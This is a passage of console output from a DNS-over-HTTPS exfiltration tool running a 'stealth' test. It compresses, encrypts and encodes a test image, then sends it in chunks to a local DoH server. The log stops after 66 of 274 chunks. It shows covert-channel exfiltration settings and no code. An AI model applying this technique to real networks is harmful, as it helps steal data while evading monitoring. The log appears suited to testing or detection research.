[client] Starting quick test: stealth.json
Starting DoH exfiltration: /app/test_data/image.png
Configuration: Server: https://doh.local/dns-query, Chunk: 12, Encoding: custom, Timing: stealth
Checking DoH server connectivity...
Testing server: https://doh.local/dns-query
Attempt 1/10...
DoH server connectivity verified with google.com
Server ready for exfiltration!
Chunk size calculation:
   File size: 6,918 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 323
   Estimated time: 2584.0s
Chunk size: 12 â†’ 30 (auto-adjusted)
ðŸ—œï¸  Compressed: 6918 -> 6165 bytes
Chunk size calculation:
   File size: 6,165 bytes
   Strategy: medium file
   Optimal chunk size: 30 chars
   Estimated chunks: 288
   Estimated time: 2304.0s
Encrypted data
Encoded with custom: 8220 chars
File size: 6918 bytes
Prepared data size: 8220 bytes
Total chunks: 274

Starting chunk transmission...
Session ID: 1755275138_b8k0w0g2
Estimated transmission time: 6576.0s
Chunk utilization: 100.0%
[  1/274] Sent chunk: 17552751-0000-0274-bP9tYe4r9zdpmpTGx2dmabjHzwxDl9....
[  2/274] Sent chunk: 17552751-0001-0274-IgISkiJSAhyBDxQGO85GY6fHavdX56....
[  3/274] Sent chunk: 17552751-0002-0274-R_WUqIggoHQIA0gJOAwpJaN0I06w-V....
[  4/274] Sent chunk: 17552751-0003-0274-qDiV-xFrOjtMH0TIpn77XO2vuHHXvf....
[  5/274] Sent chunk: 17552751-0004-0274-6B49DRcNc3SR21YDd11rcYEwYqGj5P....
[  6/274] Sent chunk: 17552751-0005-0274-VBqI8EMl8NXRMqKqqZP8YLJi3svMWc....
[  7/274] Sent chunk: 17552751-0006-0274-Wmu7RqA_-DFB_15SktNPy8LvkbezX6....
[  8/274] Sent chunk: 17552751-0007-0274-CjzyBUVVE8pqWUtrKwTsNk4O_HJX9b....
[  9/274] Sent chunk: 17552751-0008-0274-hYukenzfwEQLBEHgjJmajJPs8QCEa1....
[ 10/274] Sent chunk: 17552751-0009-0274-2-7t-T5SMAAiWDkVNQUlHT0NLRMzAt....
[ 11/274] Sent chunk: 17552751-0010-0274-zqmloLaimaWksCq3q7Wj7yq_gKCQsM....
[ 12/274] Sent chunk: 17552751-0011-0274-g10etiN8QlJNbQCqukvrXNPDUt5Z-c....
[ 13/274] Sent chunk: 17552751-0012-0274-QHMVrqauoXlXS_uejq6evoGh4oWYZm....
[ 14/274] Sent chunk: 17552751-0013-0274-Nr8cfx_CIHaGnp7NrZOzg-dnrq7OLq....
[ 15/274] Sent chunk: 17552751-0014-0274-9szdw9O4b5S9q6OnYEtVUWcWxPf_MC....
[ 16/274] Sent chunk: 17552751-0015-0274-QqPCIy6lV0zOvYuPiExNeQ8bXYgOST....
[ 17/274] Sent chunk: 17552751-0016-0274-x4nlg47MsPYidPGbtyXv3n8o_Vj2qb....
[ 18/274] Sent chunk: 17552751-0017-0274-ziABEwlPvbXeoekHTSf_0fmd_a2jEd....
[ 19/274] Sent chunk: 17552751-0018-0274-Xd-7e3r7-n8MDA6OsGuCKjKvmUxDBh....
[ 20/274] Sent chunk: 17552751-0019-0274-J___76_Z7H__m7sLi0vLK6trG5tc7H....
[ 21/274] Sent chunk: 17552751-0020-0274-ng4Di4ivg539L0hGTHUM-YxUBgC2YN....
[ 22/274] Sent chunk: 17552751-0021-0274-276iZB01uF97yBxL-qdRQRgl0uf3eT....
[ 23/274] Sent chunk: 17552751-0022-0274-QW4r3f4szaw-n499ovzWOk7HSHz9mK....
[ 24/274] Sent chunk: 17552751-0023-0274-AXVZ-P9iP2tIeKvnOa1-TRVXrOsfE6....
[ 25/274] Sent chunk: 17552751-0024-0274-dgo-yUu7Egua9yupkw0Pv96g79L4ME....
[ 26/274] Sent chunk: 17552751-0025-0274-T2eCV4e6WZcz9LL7bfqC-yGRJbqLja....
[ 27/274] Sent chunk: 17552751-0026-0274-VbzmcgNThZD_NHP4Z_9QCY7VvjFgOI....
Progress: 9.9% (27/274) - ETA: 7410.0s
[ 28/274] Sent chunk: 17552751-0027-0274-3djRDjHBDNyRykzJW3yMtlYQKxO-n5....
[ 29/274] Sent chunk: 17552751-0028-0274-ampN1Nzt5XjuZklRnuXKLxyAF_eaR4....
[ 30/274] Sent chunk: 17552751-0029-0274-0NHbzr-6fA--l1ktJdkxpdZQ0TAnkA....
[ 31/274] Sent chunk: 17552751-0030-0274-8DeFcnRdoLLHVqnlxQnJFBN3wQqR-i....
[ 32/274] Sent chunk: 17552751-0031-0274-54uyB_25k4-KBggtPsonerpBg1mtaa....
[ 33/274] Sent chunk: 17552751-0032-0274-PdldP1wvMR9ZxScYyx16oZ01nhgGm_....
[ 34/274] Sent chunk: 17552751-0033-0274-6-d8q5BWZNmwipGvRMpflE_PrC5t97....
[ 35/274] Sent chunk: 17552751-0034-0274-7sW9Tnv-TowzgWEsBbAUhbPbYgn7wg....
[ 36/274] Sent chunk: 17552751-0035-0274-dol3SRr3A-U8oZjcikT6GIa1fr56KD....
[ 37/274] Sent chunk: 17552751-0036-0274-p81Punn1K989-WmihutjA7U71VJsZI....
[ 38/274] Sent chunk: 17552751-0037-0274-Ip103OWsKDYx9sB_-iibY7H2dHm-VW....
[ 39/274] Sent chunk: 17552751-0038-0274-tcTY4JBxxU-Ru0re6oM3vTAIDBv0DJ....
[ 40/274] Sent chunk: 17552751-0039-0274-S0i_uWZwEJMPEm5L3zGLrm1D_sQ2f6....
[ 41/274] Sent chunk: 17552751-0040-0274-vQwC7WgTCZUm-cApVDGYj1z3xw5693....
[ 42/274] Sent chunk: 17552751-0041-0274-G15QYbXyQ4ilR4QBfFkZGwOJxQ1HXd....
[ 43/274] Sent chunk: 17552751-0042-0274-4hcN5kkp77mD31sHc7CQxRKR2qysRO....
[ 44/274] Sent chunk: 17552751-0043-0274-I2zJA5zxsprzlvXPIiDC65HnjrBZv3....
[ 45/274] Sent chunk: 17552751-0044-0274-wGQz-_gusEOxtqyzbyiPiOlQ4rmF3J....
[ 46/274] Sent chunk: 17552751-0045-0274-d2rzgey2SEOnQ4-pcAtJPmJmY7NBjy....
[ 47/274] Sent chunk: 17552751-0046-0274-1AAUHp4Q8kXk4lBb8Iefd85K-68Yxr....
[ 48/274] Sent chunk: 17552751-0047-0274-tSEXn0EqKZPUn5RzG8WbhOfZwwJ-2h....
[ 49/274] Sent chunk: 17552751-0048-0274-JRKstxznqBBXpYtQJfyBqA6llwd_UB....
[ 50/274] Sent chunk: 17552751-0049-0274-fYu0oVlpmvvj1PNFY48LDOGS2Ng5bW....
[ 51/274] Sent chunk: 17552751-0050-0274-SY2_kzFRFzKOjolmrxmk_uLOxTbH5J....
[ 52/274] Sent chunk: 17552751-0051-0274-Y93C9Yt_SYyuj5gh4jBbpU6dU58jgp....
[ 53/274] Sent chunk: 17552751-0052-0274-LLjs_9zbmgOHL6MPRljomKzK4Be2J1....
[ 54/274] Sent chunk: 17552751-0053-0274-HrpqTvrWdBMtMZyFe23plVdVhbdTU9....
Progress: 19.7% (54/274) - ETA: 6218.4s
[ 55/274] Sent chunk: 17552751-0054-0274-u5k3OBzkwe2tsY0H6lo_8wz9mfV1MO....
[ 56/274] Sent chunk: 17552751-0055-0274-5smTdCVYk7L3Septj60LGdVJvo1ZEa....
[ 57/274] Sent chunk: 17552751-0056-0274-CanuGjjLcGYaIqVC7iimWFcdyNrG4I....
[ 58/274] Sent chunk: 17552751-0057-0274-gbp-uZMbJ2lcergHOp_ca_p7_21n6x....
[ 59/274] Sent chunk: 17552751-0058-0274-SYa2Zj3fG-shO9hWwtLfRG1kl5tpGL....
[ 60/274] Sent chunk: 17552751-0059-0274-N72UoWrIoEzjWeUnjQ3jgOKmUfY4ea....
[ 61/274] Sent chunk: 17552751-0060-0274-Z1NaAIlGquxZrku5JNeCdufsq9-V0s....
[ 62/274] Sent chunk: 17552751-0061-0274-wq0jxttqrvnFcZciB-UzimhUHWYTlz....
[ 63/274] Sent chunk: 17552751-0062-0274-lth66fOjL-5flmR9rWh3U9aObjai0F....
[ 64/274] Sent chunk: 17552751-0063-0274-bWRZytDSzbEPrpikPIwrm4368XX5fL....
[ 65/274] Sent chunk: 17552751-0064-0274-emAQglhzezMN0BDKwn387nGRolSVIR....
[ 66/274] Sent chunk: 17552751-0065-0274-Vn_pBn7LTveYWQkjQov0l85pJ44PSX....
